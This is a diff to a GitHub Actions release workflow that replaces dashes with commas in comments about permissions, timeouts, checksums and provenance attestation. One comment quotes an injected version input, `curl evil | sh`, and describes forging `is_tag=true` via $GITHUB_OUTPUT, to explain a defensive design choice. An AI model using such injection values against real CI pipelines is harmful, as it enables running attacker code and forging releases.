@@ -3,7 +3,7 @@
 # UNIFIED RELEASES (ADR-0009, decided 2026-08-02). Every tag carries both platforms'
 # assets, whether or not that platform's code changed. This is what makes the update path
 # correct by construction: there is always an asset for the checking platform, so
-# `releases/latest` stays the right thing for the app to read. The cost is cosmetic — a
+# `releases/latest` stays the right thing for the app to read. The cost is cosmetic, a
 # Linux-only fix prompts Windows users to reinstall an identical binary.
 #
 # The alternative, publishing only the changed platform, would silently stall every Windows
@@ -19,13 +19,13 @@ on:
   workflow_dispatch:
     inputs:
       version:
-        description: "Version to build (dry run — no release is created)"
+        description: "Version to build (dry run, no release is created)"
         required: true
         default: "0.0.0-dry"
 
 # Read by default; only the job that actually publishes gets write. The build jobs run
-# third-party code — `choco install` fetches a community package, and the Linux job runs a
-# shell script from the checkout — and there is no reason any of that should hold a token
+# third-party code, `choco install` fetches a community package, and the Linux job runs a
+# shell script from the checkout, and there is no reason any of that should hold a token
 # that can create a release. Scoping it here means a compromise in a build step breaks the
 # build instead of publishing an asset the auto-updater would then install.
 permissions:
@@ -34,7 +34,7 @@ permissions:
 # Every job here carries timeout-minutes, and this is the workflow where it matters most.
 # Actions defaults to six hours, which on the tag-to-published-assets path means a wedged
 # step hangs a release half-published for most of a day, with no log readable while it does
-# it — a job's logs cannot be retrieved until it stops. That failure was measured on the
+# it, a job's logs cannot be retrieved until it stops. That failure was measured on the
 # packaging workflow on 2026-08-19 (#131); nothing makes this one immune, and the cost here
 # is higher because a release in flight has a tag pushed and users on an auto-updater.
 #
@@ -46,7 +46,7 @@ jobs:
     runs-on: windows-latest
     timeout-minutes: 20
     steps:
-      # Pinned to SHAs — see the note in ci.yml.
+      # Pinned to SHAs, see the note in ci.yml.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
       - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
         with:
@@ -64,7 +64,7 @@ jobs:
       # pasted into the script. An inline expression is substituted before bash parses the
       # line, so an input of `1.0.0"; curl evil | sh; echo "` would have run as a command,
       # and an input containing a newline would have appended its own lines to
-      # $GITHUB_OUTPUT — forging `is_tag=true` and turning an advertised dry run into a
+      # $GITHUB_OUTPUT, forging `is_tag=true` and turning an advertised dry run into a
       # real published release.
       #
       # The shape check is the second half of that: it is what actually guarantees the
@@ -91,7 +91,7 @@ jobs:
           # that calls itself 0.6.10. One release, two version strings, and the mismatch only
           # shows up in whatever reads the other one.
           #
-          # No upper bound on a vector — comparison is numeric per component (ReleaseVersion),
+          # No upper bound on a vector, comparison is numeric per component (ReleaseVersion),
           # so 100 sorts above 99 exactly as 10 sorts above 9. A cap would be an arbitrary
           # reason to bump a higher vector, and one nothing else in the chain enforces.
           #
@@ -190,15 +190,15 @@ jobs:
     # releases exist to prevent.
     needs: [version, windows, linux]
     runs-on: ubuntu-latest
-    # Uploads six assets, checksums and an attestation — network-bound, so the most generous
+    # Uploads six assets, checksums and an attestation, network-bound, so the most generous
     # of the short jobs. It is also the one job whose hanging leaves a tag published with
     # assets missing, which is the state this bound most needs to fail out of rather than sit in.
     timeout-minutes: 20
     # The only job that publishes, and so the only one that needs to be able to.
     #
     # id-token and attestations are the price of provenance. They are genuinely broader than
-    # contents: write — id-token: write mints an OIDC token identifying this workflow, which
-    # is what Sigstore signs against — so they are granted here, on the one job that already
+    # contents: write, id-token: write mints an OIDC token identifying this workflow, which
+    # is what Sigstore signs against, so they are granted here, on the one job that already
     # holds publish rights, and nowhere else. Granting them at workflow scope would hand an
     # OIDC identity to the jobs running `choco install` and a checked-out shell script, which
     # is the opposite of what the scoping in the previous change was for.
@@ -227,7 +227,7 @@ jobs:
           merge-multiple: true
 
       # The workflow writes these names and the app matches them (ReleaseAssets). That is
-      # one decision in two places, so it is asserted rather than assumed — a rename on
+      # one decision in two places, so it is asserted rather than assumed, a rename on
       # either side otherwise shows up as an app that quietly stops updating.
       - name: Every expected asset is present
         run: |
@@ -261,7 +261,7 @@ jobs:
       #
       # What it is not. A checksum published by the same pipeline that built the
       # asset does not defend against a compromised GitHub account or a compromised release
-      # job — whoever can replace the asset can replace this file next to it. It defends
+      # job, whoever can replace the asset can replace this file next to it. It defends
       # against tampering or corruption between the release and the user, against a
       # partially-swapped asset set, and against a truncated download that would otherwise
       # be executed. The attestation step below is what covers the case this one cannot.
@@ -269,7 +269,7 @@ jobs:
       # Generated here rather than staged by the build jobs, so it cannot be forgotten:
       # there is no path through this job that publishes assets without also publishing
       # their checksums. The count assertion is what makes that a guarantee rather than an
-      # intention — a client that fails closed on a missing entry (the follow-up PR) strands
+      # intention, a client that fails closed on a missing entry (the follow-up PR) strands
       # every user if this file is ever incomplete, which is the same failure mode as
       # renaming a frozen asset.
       - name: Checksums for every published asset
@@ -300,8 +300,8 @@ jobs:
       # pipeline as the assets, so anyone able to replace an asset can replace the manifest
       # beside it. An attestation cannot be forged that way: the signature is over a GitHub
       # OIDC token that only a run of THIS workflow, in THIS repository, can obtain. An asset
-      # uploaded to a release by any other route — a stolen PAT attaching a file to an
-      # existing release, a release created by hand, an asset swapped after publication — has
+      # uploaded to a release by any other route, a stolen PAT attaching a file to an
+      # existing release, a release created by hand, an asset swapped after publication, has
       # no valid attestation, and `gh attestation verify` says so.
       #
       # What it still does not cover, stated so it is not mistaken for more. Anyone who can
@@ -315,7 +315,7 @@ jobs:
       # jobs and attested here, after travelling through upload/download-artifact. The
       # attestation therefore binds the bytes to this workflow run, not to the specific job
       # that compiled them. Closing that gap means attesting in each build job, which needs
-      # id-token: write in the jobs this workflow deliberately keeps it out of — a worse
+      # id-token: write in the jobs this workflow deliberately keeps it out of, a worse
       # trade than the one it fixes.
       #
       # SHA256SUMS is deliberately NOT attested. It is a description of the other assets, not
@@ -327,7 +327,7 @@ jobs:
       # a step first exercised by the release that needs it to work. The permissions and the
       # action are exactly what a dry run should be proving. The cost is an attestation
       # recorded against a throwaway 0.0.0-dry digest that no release ever publishes, which is
-      # inert — attestations are looked up by artifact digest, and nobody holds that artifact.
+      # inert, attestations are looked up by artifact digest, and nobody holds that artifact.
       - name: Attest build provenance
         uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
         with:
@@ -339,7 +339,7 @@ jobs:
 
       # Auto-generated notes are a list of merged PRs. They never say which of six assets a
       # given user wants, that GNOME needs an extension before the icon can appear, or that
-      # Linux updates come from apt rather than from inside the app — and those are the three
+      # Linux updates come from apt rather than from inside the app, and those are the three
       # things a first-time Linux user most needs (#84). So the evergreen header is
       # prepended to the generated section rather than replacing it.
       # $TAG and $GITHUB_REPOSITORY below are environment variables rather than inline
@@ -348,7 +348,7 @@ jobs:
       # into this script would run as a command in the one job that holds contents: write.
       #
       # That explanation lives HERE, in a YAML comment, and not inside the run: block below.
-      # A run: block is a YAML block scalar — every line of it is part of the script string,
+      # A run: block is a YAML block scalar, every line of it is part of the script string,
       # including the ones beginning with '#', and Actions evaluates expression syntax across
       # the whole value before bash ever sees it. Writing the two-brace token inside the block
       # to talk *about* it therefore fails the workflow to parse with "an expression was
@@ -380,7 +380,7 @@ jobs:
       - name: Dry run summary
         if: needs.version.outputs.is_tag != 'true'
         run: |
-          echo "Dry run — every asset built and named correctly. No release created."
+          echo "Dry run, every asset built and named correctly. No release created."
           echo "Tag the commit to publish."
 
       - name: Create release
